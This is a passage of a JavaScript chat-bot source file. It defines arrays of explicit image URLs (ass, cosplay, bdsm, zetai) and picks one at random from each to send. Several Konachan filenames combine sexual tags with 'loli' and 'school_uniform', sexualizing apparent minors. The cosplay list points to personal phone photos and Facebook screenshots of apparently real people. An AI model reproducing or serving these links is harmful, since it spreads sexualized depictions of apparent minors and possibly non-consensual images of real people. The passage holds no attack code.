"https://konachan.com/sample/2897b42d557af1972c6dba4e48c3d3a0/Konachan.com%20-%20316311%20sample.jpg",
"https://konachan.com/sample/d3c7f65c3ba1deda7c12d02982661994/Konachan.com%20-%20316300%20sample.jpg",
"https://konachan.com/sample/8024a9645ca1f617e47a5517a9877be4/Konachan.com%20-%20316199%20sample.jpg",
"https://konachan.com/sample/737a707688c52fdfdd74797e76d67ee2/Konachan.com%20-%20316192%20sample.jpg",
"https://konachan.com/sample/ceb60e71af03f2a43958ef254619c537/Konachan.com%20-%20316191%20sample.jpg",
"https://konachan.com/sample/99c4d8b8972dc3c2bf9c7ea2788a8fdc/Konachan.com%20-%20316189%20sample.jpg",
"https://konachan.com/jpeg/60c4f47203e1b09a085058c7fb12c9b6/Konachan.com%20-%20316185%20ass%20blush%20braids%20kanojo_okarishimasu%20miazi%20panties%20purple_eyes%20red_hair%20sakurasawa_sumi%20school_uniform%20skirt%20thighhighs%20underwear%20waifu2x.jpg",
"https://konachan.com/jpeg/a0863dacd6d8ad422e50aeb423d80111/Konachan.com%20-%20316184%20anus%20ass%20blush%20braids%20censored%20kanojo_okarishimasu%20miazi%20nopan%20purple_eyes%20pussy%20red_hair%20sakurasawa_sumi%20school_uniform%20skirt%20thighhighs%20waifu2x%20wet.jpg",
"https://konachan.com/sample/47d6969795731490979501abb28176b2/Konachan.com%20-%20316173%20sample.jpg",
"https://konachan.com/sample/09db6cfe17cb284dd18a06b2ede6632e/Konachan.com%20-%20316126%20sample.jpg",
"https://konachan.com/sample/9300481457d1856a38433de5716d9c89/Konachan.com%20-%20316108%20sample.jpg",
"https://konachan.com/sample/0bba0d6536375fe5565b7ac51ed7db88/Konachan.com%20-%20316089%20sample.jpg",
"https://konachan.com/sample/dcaf0a2ad0b79ff1717a18359ec44996/Konachan.com%20-%20316088%20sample.jpg",
"https://konachan.com/sample/24dd2b888c41ee50381c826de335705b/Konachan.com%20-%20316011%20sample.jpg",
"https://konachan.com/sample/139b396b35f3dfcd24ee77952170b1b5/Konachan.com%20-%20316002%20sample.jpg",
"https://konachan.com/sample/d274dae687e5755fa73dfe709de90b47/Konachan.com%20-%20316017%20sample.jpg",
"https://konachan.com/sample/6b56f616636dee37b9cd7a3f4286bb9c/Konachan.com%20-%20316447%20sample.jpg",
"https://konachan.com/sample/96f609d7d44c728efc56981706925b31/Konachan.com%20-%20315247%20sample.jpg",
"https://konachan.com/sample/f9fa53d9c84cb91e888ffebbaadb60dd/Konachan.com%20-%20314894%20sample.jpg",
"https://konachan.com/sample/6e240863e0243abfe6bb8d959464fa7c/Konachan.com%20-%20314481%20sample.jpg",
"https://konachan.com/sample/72faaad5c52e32d951f30c92954bee2e/Konachan.com%20-%20314326%20sample.jpg",
"https://konachan.com/sample/d85db565ce195e5fbc3fcc4045f80fe0/Konachan.com%20-%20313418%20sample.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770952689529126943/59355205_p2_-_Collection_Vol_1.png",
"https://cdn.discordapp.com/attachments/770948564947304448/770989028895621151/Hentai_nation_1.jpeg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989034469195777/Hentai_nation_1.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989081248268345/Hentai_nation_3.png",
"https://cdn.discordapp.com/attachments/770948564947304448/770989204455948298/Hentai_nation_11.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989363567788063/Hentai_nation_12.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989367719624764/Hentai_nation_4.jpeg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989378264629268/Hentai_nation_5.jpeg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989382194167888/Hentai_nation_8.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989384530657300/Hentai_nation_9.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989386887725086/Hentai_nation_10.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989398380118056/Hentai_nation_8.jpeg",
"https://cdn.discordapp.com/attachments/770948564947304448/771000750528397312/496-iKzmSR7QPV4.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771016314759413850/1648-AYOTgvqxtLw.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771016668159803422/1694-22uvMW0T09I.jpg",
"https://cdn.discordapp.com/attachments/707201738255368194/771373670655852575/RJ290927_img_smp1.png",
"https://cdn.discordapp.com/attachments/707201738255368194/771377721699074048/947c1173cccc094affd65ba4d1c817b5.png",
"https://i.imgur.com/1JJpaxX.jpg"
]

const NsfwAss = ass[Math.floor(Math.random() * ass.length)]

//===============> [ Batas ] <===============\\
const cosplay = [
"https://cdn.nekobot.xyz/e/9/6/ffc914822489a51b2946e5d2f150b.jpg",
"https://cdn.nekobot.xyz/b/9/a/114079157c091a632f839c93bf546.jpg",
"https://i0.nekobot.xyz/4/0/0/a26b285804a922d7a155523b23f32.jpg",
"https://i0.nekobot.xyz/4/9/0/4fb8a1caeac76e0460874b55dd24b.jpg",
"https://cdn.nekobot.xyz/d/2/4/fc06e03e644b809f8a326915e11e1.jpg",
"https://cdn.nekobot.xyz/e/3/8/2dd83e6cb351625c91d6be01d4294.jpg",
"https://i0.nekobot.xyz/6/6/3/f020e750c8b284218f85fdecbb576.jpg",
"https://cdn.nekobot.xyz/b/6/b/37deea40362f1816bdd212c0b6d59.jpg",
"https://i0.nekobot.xyz/2/3/d/cc380af646f2e95b68845c9587f9e.jpg",
"https://i0.nekobot.xyz/3/9/f/6b32934d825333444a46e0109f396.jpg",
"https://cdn.nekobot.xyz/a/b/1/a83112e57f55180bfc2f5a4549775.jpg",
"https://cdn.nekobot.xyz/e/2/c/ff576d535e7c87377c24e24d2bdb6.jpg",
"https://i0.nekobot.xyz/6/d/0/00989a5aab58b3ddd884ff15bdea3.gif",
"https://i0.nekobot.xyz/7/d/8/df337eb2aee6fb3fef37564ef0e4e.jpg",
"https://i0.nekobot.xyz/7/f/1/6287d2fbbf89b48f5e86f258d2ac6.jpg",
"https://i0.nekobot.xyz/7/0/4/a8208770466ba0951f97d61d5c170.jpg",
"https://i0.nekobot.xyz/7/b/0/f7da7635f3f6c34a664ffdd4cd24b.jpg",
"https://cdn.nekobot.xyz/a/2/5/1e4efb710f4a7ca22d109ac07e8cc.jpg",
"https://cdn.nekobot.xyz/b/d/a/87a13044fd418d8ebb869ccbc9477.jpg",
"https://cdn.nekobot.xyz/f/0/d/44b2d88fc52c9f3f2dfd9c7201f5d.jpg",
"https://cdn.nekobot.xyz/e/9/2/3e0f3bd320243c20718f6f5f0538b.jpg",
"https://i0.nekobot.xyz/6/f/1/f8a585487112ba9e23219c4b9c7e4.jpg",
"https://i0.nekobot.xyz/2/8/5/70b379c84d0391ab4e685afdccd6f.jpg",
"https://cdn.nekobot.xyz/d/7/6/d459a30cd3c3337522a86d6eaceeb.jpg",
"https://i0.nekobot.xyz/7/7/9/dd0950bfb9e74f9379a3d5a8abf8e.jpg",
"https://cdn.nekobot.xyz/a/9/9/c00c7bf15a7e30cc7df22051d77ce.jpg",
"https://cdn.nekobot.xyz/f/9/d/a3af76465ade7618d158a24bb78cb.jpg",
"https://i0.nekobot.xyz/7/8/6/22aa2a3f038caf996340b5a7743b1.jpg",
"https://cdn.nekobot.xyz/e/7/4/086fcdaa0851ebedc005b259093f4.jpg",
"https://i0.nekobot.xyz/5/8/f/8698738e8418f3b9f69de488b1abf.jpg",
"https://i0.nekobot.xyz/3/2/1/217008cd5a2a13c559d94cbcb6a8a.jpg",
"https://i0.nekobot.xyz/6/1/9/a38ee5c9e81b1fbf105e9d072aaee.jpg",
"https://cdn.nekobot.xyz/e/c/f/06f51474fcafa8f9c23c5462c8b22.jpg",
"https://i0.nekobot.xyz/6/b/6/f4508098d6268827ca66bf74a1fb4.jpg",
"https://i0.nekobot.xyz/2/a/1/64dde238e5216b9745fcf5a82aa47.jpg",
"https://i0.nekobot.xyz/6/0/9/34acdcd0ba1f31eb1bf531ce8271b.jpg",
"https://cdn.nekobot.xyz/a/a/0/843b46e84d2351633da2f2bf529ca.jpg",
"https://i0.nekobot.xyz/1/1/6/546fb6b6681de8d29081f2972abaa7061dee1.jpg",
"https://i0.nekobot.xyz/4/8/a/04a844de6f0af84b1a5e540bd05b1.jpg",
"https://cdn.nekobot.xyz/d/8/6/5e2770754df2d15ed501a0b9808e4.jpg",
"https://i0.nekobot.xyz/3/7/0/53bb8a0b03f59fd16fabb123760fa.jpg",
"https://i0.nekobot.xyz/5/a/2/126c89a323de9ba7e02c45c952261.jpg",
"https://cdn.nekobot.xyz/d/d/1/fd741e67a592ec02b925c5121855b.jpg",
"https://i0.nekobot.xyz/1/b/8/222990d810d5fae5dfb8d15d56a51.jpg",
"https://i0.nekobot.xyz/6/e/9/ba83ab0b45944ee9edf1a1ca1dcef.jpg",
"https://cdn.nekobot.xyz/f/9/c/83df5bfcfcfb877c23da9140609ac.jpg",
"https://i0.nekobot.xyz/2/b/a/03d91913fb6395a9ed47452e51ee2.jpg",
"https://cdn.nekobot.xyz/9/e/3/8b6138a79c91f1c3bc974f3c9999a.jpg",
"https://cdn.nekobot.xyz/f/3/6/e9ebea57374ed4f5aefd3d30867c0.jpg",
"https://cdn.nekobot.xyz/b/7/5/070d4c695cf0158292a69f4771fd3.jpg",
"https://i0.nekobot.xyz/6/b/5/147b038ffe5b81003e1ecf9cf1561d109987e.jpg",
"https://i0.nekobot.xyz/8/c/9/502c9804a1a153ca24e4d270b2f4a.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352241099608114/20220530_014953.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352262100500622/20220530_015118.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352355490877530/20220530_015248.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352355838984313/20220531_003114.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352356208099358/Screenshot_20220820-203954_Gallery.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352356489101342/Screenshot_20220429-235311_Facebook.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352356812075128/Screenshot_20220429-234533_Facebook.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352357080506540/Screenshot_20220429-235010_Facebook.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352357407666297/Screenshot_20220429-234857_Facebook.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352144362188800/20220306_045313.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352144907436203/20220311_135858.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352145247191152/20220429_165704.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352145700167700/20220306_045104.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352145935044658/20220429_165748.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352237517684818/20220429_165746.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352237870010519/20220306_045346.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352238385905674/20220531_003105.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352238759202817/20220616_022459.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352240243986502/20220705_072420.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352240529190962/20220429_165538.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352240793419836/20220530_015130.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352241099608114/20220530_014953.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352262100500622/20220530_015118.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352355490877530/20220530_015248.jpg",
"https://media.discordapp.net/attachments/1017089820369100872/1020352355838984313/20220531_003114.jpg"
]

const NsfwCosplay = cosplay[Math.floor(Math.random() * cosplay.length)]


//===============> [ Batas ] <===============\\
const bdsm = [
"https://media.discordapp.net/attachments/531827668002275328/682642520060330037/fdbiq6ovshj41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/682430717652893754/62brFYV_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/682747340041224248/4Gg9Cp2_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/682403179966759034/TmOtKZi_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/682217495519690759/3j4PMzx_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/682097348377444353/6dr1sjocd6j41.png",
"https://media.discordapp.net/attachments/531827668002275328/681944451509256256/s5olejpbogi41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681880153022136427/lw6pzke4m2j41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681855096870797342/ijj5qvoyc2j41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681855083830706188/boe5obvha2j41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681855060774617121/yda6zvj7a2j41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681633595336425528/1rah2.png",
"https://media.discordapp.net/attachments/531827668002275328/681617579437326337/wqecde5s0xi41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681223233403486208/fCNMdAp_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/681072466344411293/6ACB9EE.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680816567189110803/yTj4mnP_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680487709894115333/ZrnsiEE_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680187310377009192/m9dfn0cte4h41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680187145519890496/3B0Qg2t_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680187145209905189/ohbefszcy4i41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680164120334565408/2270b80.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680058208118636562/zlqc3z4b80i41.jpg",
"https://media.discordapp.net/attachments/531827668002275328/680051413883289726/f68c85c.png",
"https://media.discordapp.net/attachments/531827668002275328/680051413312864299/6ae2e79.jpg",
"https://media.discordapp.net/attachments/531827668002275328/679341436411445256/IUHUn9u_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/678711958500802560/484738f.png",
"https://media.discordapp.net/attachments/531827668002275328/678711958048079882/346a200.jpg",
"https://media.discordapp.net/attachments/531827668002275328/678711957800484884/ddfe48b.jpg",
"https://media.discordapp.net/attachments/531827668002275328/678711957028864052/a1dc7ca.png",
"https://media.discordapp.net/attachments/531827668002275328/677683354623148033/DevilHS-775781-MR.png",
"https://media.discordapp.net/attachments/531827668002275328/677362365116841984/erzzz151lkg41.png",
"https://media.discordapp.net/attachments/531827668002275328/677028522652467231/image1.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028522501341194/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028518609027102/image9.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028518248579103/image8.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028518021955604/image7.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028517564645376/image6.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028517325701139/image5.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028516713463808/image3.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028516285513738/image2.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028516092706816/image1.jpg",
"https://media.discordapp.net/attachments/531827668002275328/677028515836723220/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/676127612002631694/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/674469521481793536/lj2edPZ5AD0lLyKJu4JVuBBBOk6ly_EHuFxNx7xqWkQ.png",
"https://media.discordapp.net/attachments/531827668002275328/674469495309336578/Ff8oAs5Q1lab8g9AwvYRsN3WE980M1638KJTiicbbqo.png",
"https://media.discordapp.net/attachments/531827668002275328/674469461415297034/89eKMcnoEkORlVzG8KqIoZvo4xBOsa8TzSeLcLJqpxk.png",
"https://media.discordapp.net/attachments/531827668002275328/674469432143380480/VAlo--OJwESYsuYyetifb6G7feKSvRecA7HbuOPuGKI.png",
"https://media.discordapp.net/attachments/531827668002275328/674469228925157376/ym2eoh217i841.png",
"https://media.discordapp.net/attachments/531827668002275328/674469195538235402/9a913fhf42a31.png",
"https://media.discordapp.net/attachments/531827668002275328/673780241491165216/vwah47yqt4o31.png",
"https://media.discordapp.net/attachments/531827668002275328/673775654524944424/h9mg9nb8ele41.png",
"https://media.discordapp.net/attachments/531827668002275328/673766182691799090/FFZUenqIv9lJLYphG-syZyKyCEMH2kLzMH3hCeWgMFo.png",
"https://media.discordapp.net/attachments/531827668002275328/673765900410945564/NZ28NeaHY6LQQmysatMVVLVESpOySnUtZORluTLASp4.png",
"https://media.discordapp.net/attachments/531827668002275328/673764708507189261/xt8ov8wtzv931.png",
"https://media.discordapp.net/attachments/531827668002275328/673764414343741440/vfeIOOfhUUQcZ9VA9wzVA0cdbP9UhpAVPr6qrE5X70I.png",
"https://media.discordapp.net/attachments/531827668002275328/673764386048835604/frx8fgaPRWMth55XpBgX0AW7R4dpp0HS9b_UQ7vdyZA.png",
"https://media.discordapp.net/attachments/531827668002275328/673760648634826783/bu8mcku29rn31.png",
"https://media.discordapp.net/attachments/531827668002275328/673757970676449300/Qi9XysPW-OP-y8RYKOyzl9Nl0vPUh8vHH_ssyag6fr4.png",
"https://media.discordapp.net/attachments/531827668002275328/670981689438240778/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/669512612366516234/dark_elementalist_lux_elementalist_lux_and_luxanna_crownguard_league_of_legends_drawn_by_kumiko_shib.jpg",
"https://media.discordapp.net/attachments/531827668002275328/666766388911931420/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/666260491626086403/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/666063880287420434/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/665947713916895232/blagectzq1641.png",
"https://media.discordapp.net/attachments/531827668002275328/665721393601577012/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/665637982757191680/image3.jpg",
"https://media.discordapp.net/attachments/531827668002275328/665637981511614477/image1.jpg",
"https://media.discordapp.net/attachments/531827668002275328/665637981511614475/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/665621659537113098/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/665608395654692864/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/664182605884686349/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/664162725005361162/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/660748893964730369/5b6fe4e2cba55c5700100546781dd46d.png",
"https://media.discordapp.net/attachments/531827668002275328/660679829032534036/IMG_20191223_114520.jpg",
"https://media.discordapp.net/attachments/531827668002275328/660679680797442049/77933007_p0_master1200.png",
"https://media.discordapp.net/attachments/531827668002275328/660154664418803748/lPe9gOi.png",
"https://media.discordapp.net/attachments/531827668002275328/660154664418803722/cc5nzdcx0r641.jpg",
"https://media.discordapp.net/attachments/531827668002275328/660154435464462380/JiJjLGu.png",
"https://media.discordapp.net/attachments/531827668002275328/660154357853192192/QY6Tinq.jpg",
"https://media.discordapp.net/attachments/531827668002275328/660096044037832715/80693261_1899427176856409_1937826288324575232_o.jpg",
"https://media.discordapp.net/attachments/531827668002275328/659482294230319140/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/658075033393954860/image3.jpg",
"https://media.discordapp.net/attachments/531827668002275328/658075032488116247/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/657016648254881816/7eea07a.jpg",
"https://media.discordapp.net/attachments/531827668002275328/656896372330725396/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/655454798136475659/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/651118987773476889/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/648392695881924609/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/648392667612577792/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/648392530982862870/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/648392239470477333/image1.jpg",
"https://media.discordapp.net/attachments/531827668002275328/648392239470477332/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/644958744945360906/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/644717099402657792/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/643475499301077002/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/641680857106743305/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/641136647047610408/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/640395541133393920/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/639262742175416330/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/636157286112559104/himaJYw.jpg",
"https://media.discordapp.net/attachments/531827668002275328/683361680012345511/vuu6i60p4wj41.png",
"https://media.discordapp.net/attachments/531827668002275328/683517408434192416/KQ3VjfG_d.jpg",
"https://media.discordapp.net/attachments/531827668002275328/632998232452104202/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/632338880300843019/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/631301661557522434/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/630448178491293747/image0.png",
"https://media.discordapp.net/attachments/531827668002275328/630448111336161300/image0.png",
"https://media.discordapp.net/attachments/531827668002275328/630448109461438474/image0.png",
"https://media.discordapp.net/attachments/531827668002275328/630448101211242516/image0.png",
"https://media.discordapp.net/attachments/531827668002275328/630448093711564800/image0.png",
"https://media.discordapp.net/attachments/531827668002275328/630446043980496906/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/630446037819064328/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/630043978040999936/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/630037129334095873/image0.jpg",
"https://media.discordapp.net/attachments/531827668002275328/630037117044523029/image0.jpg",
"https://konachan.com/sample/a616f14280c1c3e4c026fad4d6c32c55/Konachan.com%20-%20316710%20sample.jpg",
"https://konachan.com/jpeg/3dfcf485e33fc56b503325ef23a78037/Konachan.com%20-%20316568%20aqua_eyes%20blonde_hair%20bondage%20braids%20cameltoe%20fang%20fate_grand_order%20fate_%28series%29%20flat_chest%20long_hair%20scarlettear33%20swimsuit%20tentacles.jpg",
"https://konachan.com/sample/fd3336855eff4096c07b0ed3445d54e1/Konachan.com%20-%20316455%20sample.jpg",
"https://konachan.com/sample/6b56f616636dee37b9cd7a3f4286bb9c/Konachan.com%20-%20316447%20sample.jpg",
"https://konachan.com/sample/6d50fa9d193d2b7be8ea12f362b80c84/Konachan.com%20-%20315883%20sample.jpg",
"https://konachan.com/sample/a92c3ad312ecc4fccf7f583e4849c1ae/Konachan.com%20-%20315884%20sample.jpg",
"https://konachan.com/sample/346b73a9a6249b76b4d902c1e10e8f3a/Konachan.com%20-%20315828%20sample.jpg",
"https://konachan.com/sample/647c499d8b46970042625601133a0d18/Konachan.com%20-%20315321%20sample.jpg",
"https://konachan.com/sample/362725c208ad806b49e63f40561caeac/Konachan.com%20-%20315320%20sample.jpg",
"https://konachan.com/sample/7e331d148a2b345d8891d4b2a9c5d7a0/Konachan.com%20-%20315248%20sample.jpg",
"https://konachan.com/sample/96f609d7d44c728efc56981706925b31/Konachan.com%20-%20315247%20sample.jpg",
"https://konachan.com/jpeg/0918ba4a839a54019d9134c9a53c387b/Konachan.com%20-%20315198%20anthropomorphism%20ass%20azur_lane%20bondage%20long_hair%20panties%20pantyhose%20red_hair%20see_through%20skirt%20skirt_lift%20twintails%20underwear%20yoshiheihe.jpg",
"https://konachan.com/sample/f9fa53d9c84cb91e888ffebbaadb60dd/Konachan.com%20-%20314894%20sample.jpg",
"https://konachan.com/sample/a5493092fa07fd55606e05b4bf98748a/Konachan.com%20-%20314756%20sample.jpg",
"https://konachan.com/sample/bc2d55af82a86072330a918499be8788/Konachan.com%20-%20314542%20sample.jpg",
"https://konachan.com/sample/6e240863e0243abfe6bb8d959464fa7c/Konachan.com%20-%20314481%20sample.jpg",
"https://konachan.com/sample/72faaad5c52e32d951f30c92954bee2e/Konachan.com%20-%20314326%20sample.jpg",
"https://konachan.com/sample/a2441778a6bafd4251936727b3bd4df3/Konachan.com%20-%20314069%20sample.jpg",
"https://konachan.com/sample/266e384f3d043ab4a5e37c108a5a2bfd/Konachan.com%20-%20314065%20sample.jpg",
"https://konachan.com/sample/caff5e7274a8141e95822913af15d9da/Konachan.com%20-%20314032%20sample.jpg",
"https://konachan.com/sample/851c56b73b204a704410a44605d069aa/Konachan.com%20-%20313782%20sample.jpg",
"https://konachan.com/jpeg/163ed4cbe0e542484733e18a953683ea/Konachan.com%20-%20313778%20aliasing%20arknights%20black_hair%20blush%20bodhi_wushushenghua%20bondage%20breasts%20chain%20cleavage%20eunectes_%28arknights%29%20flowers%20garter%20goggles%20tail.jpg",
"https://konachan.com/sample/e94bc73cafb5d81656f0f54051a3676f/Konachan.com%20-%20313642%20sample.jpg",
"https://konachan.com/sample/0fe74ca43f2ccdb1d2406f5dfcde1a1a/Konachan.com%20-%20313640%20sample.jpg",
"https://konachan.com/sample/bef9b55682a955d13d373f3e6f179dcd/Konachan.com%20-%20313498%20sample.jpg",
"https://konachan.com/sample/01db1ae10738b66923954534a30ffb52/Konachan.com%20-%20313423%20sample.jpg",
"https://konachan.com/sample/d85db565ce195e5fbc3fcc4045f80fe0/Konachan.com%20-%20313418%20sample.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771001917278912543/573-16reT2pK3sc.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771017155272507412/1758-DcgdH3kfJTY.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771017302874390558/1814-5G-g9PY315s.jpg"
]

const NsfwBdsm = bdsm[Math.floor(Math.random() * bdsm.length)]


//===============> [ Batas ] <===============\\
const zetai = [
  "https://konachan.com/image/e5d8cdf95933ac0965562974b5420dc0/Konachan.com%20-%20318834%20bikini_top%20blush%20breasts%20choker%20cleavage%20cropped%20cross%20fang%20gray_hair%20green_eyes%20katana%20long_hair%20navel%20original%20pink%20skirt%20sword%20thighhighs%20weapon.png",
  "https://konachan.com/image/1ea1cb824046f8804048aa01fafaf7e0/Konachan.com%20-%20310941%20amano_don%20blush%20breasts%20brown_eyes%20brown_hair%20long_hair%20necklace%20original%20phone%20spread_legs%20thighhighs%20zettai_ryouiki.jpg",
  "https://konachan.com/image/81887a167a92e2618ff875448b004543/Konachan.com%20-%20253342%20ass%20breasts%20brown_eyes%20chain%20cum%20gloves%20gray_hair%20green_eyes%20headband%20jack_dempa%20long_hair%20male%20military%20open_shirt%20twintails%20uniform%20white_hair.png",
  "https://konachan.com/image/a7345fd96f102eeebe36e866f454f500/Konachan.com%20-%20317205%20bicolored_eyes%20blush%20boots%20choker%20game_cg%20gray_hair%20hat%20hulotte%20ikegami_akane%20kuzunoha_chitose%20long_hair%20shorts%20thighhighs%20zettai_ryouiki.png",
  "https://konachan.com/image/d360ce64842e9fe071a9b99217b4cec7/Konachan.com%20-%20317229%20ass%20atelier%20atelier_ryza%20book%20brown_eyes%20brown_hair%20hat%20reisalin_stout%20short_hair%20shorts%20tosaka0002%20zettai_ryouiki.jpg",
  "https://konachan.com/image/22991bbce656ba5c5ca2e15258dc26d4/Konachan.com%20-%20317732%20black_hair%20blush%20bra%20breasts%20cat_smile%20choker%20cleavage%20fang%20necklace%20open_shirt%20original%20purple_eyes%20shirt%20short_hair%20skirt%20thighhighs%20underwear.png",
  "https://konachan.com/image/de44f7ff2bf404d244eac41bca630921/Konachan.com%20-%20316751%20amano_kusatsu%20animal_ears%20azur_lane%20blue_eyes%20breasts%20butterfly%20cleavage%20foxgirl%20gray_hair%20moon%20multiple_tails%20skirt%20tail%20zettai_ryouiki.jpg",
  "https://konachan.com/image/10bd0d170d582f9de66c2bc08aac500c/Konachan.com%20-%20318752%20animal%20animal_ears%20azur_lane%20ball%20blush%20brown_hair%20doll%20fox%20foxgirl%20loli%20lolikaku%20long_hair%20navel%20panties%20see_through%20thighhighs%20underwear%20yellow_eyes.png",
  "https://konachan.com/image/36eb69bbd410bccb7b2769074cc42cf7/Konachan.com%20-%20318310%20anus%20apron%20ass%20blush%20breasts%20censored%20cleavage%20close%20gin00%20headdress%20long_hair%20maid%20nude%20pussy%20red_hair%20skirt%20upskirt%20waitress%20white%20wink%20wristwear.jpg",
  "https://konachan.com/image/0b01dcf1a95e9cd83773d49fda592bc4/Konachan.com%20-%20317396%20arknights%20breasts%20cleavage%20dress%20gradient%20horns%20long_hair%20purple_eyes%20red_hair%20surtr_%28arknights%29%20tuzhate%20zettai_ryouiki.jpg",
  "https://konachan.com/image/6f8770b9b281f47b3297296b78193a7f/Konachan.com%20-%20316461%20black_hair%20breasts%20cameltoe%20long_hair%20original%20panties%20purple_eyes%20sideboob%20skirt%20skirt_lift%20spread_legs%20thighhighs%20twintails%20underwear%20upskirt%20white.png",
  "https://konachan.com/image/346ce22adbf3be5f6a112755e7cb2342/Konachan.com%20-%20299688%20black_hair%20blush%20cqingwei%20kimetsu_no_yaiba%20kochou_shinobu%20navel%20purple_eyes%20pussy_juice%20school_uniform%20short_hair%20skirt%20thighhighs%20zettai_ryouiki.png",
  "https://konachan.com/image/741b28b2dd56b727c024fe4d00091e19/Konachan.com%20-%20316652%20aqua_hair%20choker%20glasses%20kitasaya_ai%20navel%20original%20purple_eyes%20short_hair%20skirt%20thighhighs%20zettai_ryouiki.jpg",
